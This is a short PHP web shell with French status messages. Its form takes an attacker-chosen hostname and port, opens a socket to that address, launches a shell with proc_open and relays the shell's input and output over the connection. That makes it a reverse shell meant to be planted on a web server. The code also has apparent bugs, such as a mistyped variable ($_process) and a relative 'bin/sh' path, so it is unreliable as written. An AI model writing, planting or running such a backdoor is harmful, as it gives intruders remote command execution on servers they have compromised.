 <?php
	if(!isset($_POST['hostname'])){
		
		print "Running:" .phpversion() ."<br/>";
?>
		<html><body><form method="POST">
		<input type="text" name="hostname" value="1.2.3.4"><br/>
		Port : <input type="text" name="port" value="10000" size="5"><br/>
		<input type="submit" value="GO"/>
		</form></body></html>
<?php
	}
	
		set_time_limit(0);
		$stocket=fsockopen($_POST['hostname'],$_POST['port'],$errno,$errstr,10);
		if(!$stocket){
			echo "Impossible de ce connecter";
		}
		
		$decriptorspec = array(
			0=>array("pipe","r"),
			1=>array("pipe","w"),
			2=>array("pipe","r")
		);
		
		$process = proc_open('bin/sh',$decriptorspec,$pipes);
		
		if(is_resource($_process)){
			
			while(1){
				
				$tocheck = array($pipes[1],$pipes[2],$stocket);
				
				$int = stream_select($tocheck,$a=NULL,$b=NULL,0);
				
				if(in_array($pipes[1],$tocheck)){
					$input=fread($pipes[1],4999);
					if(strlen($input)==0)die("Fini de jouer(software existe?)");
					fwrite($stocket,$input);
				}
				
				if(in_array($pipes[2],$tocheck)){
					$input=fread($pipes[2],4999);
					if(strlen($input)==0)die("Fini de jouer(software existe?)");
					fwrite($stocket,$input);
				}
				
				if(in_array($stocket,$tocheck)){
					$input=fread($stocket,4999);
					if(strlen($input)==0)die("Fini de jouer, client quitté");
					fwrite($pipes[0],$input);
				}
				
			}
		}
		
		die();
?>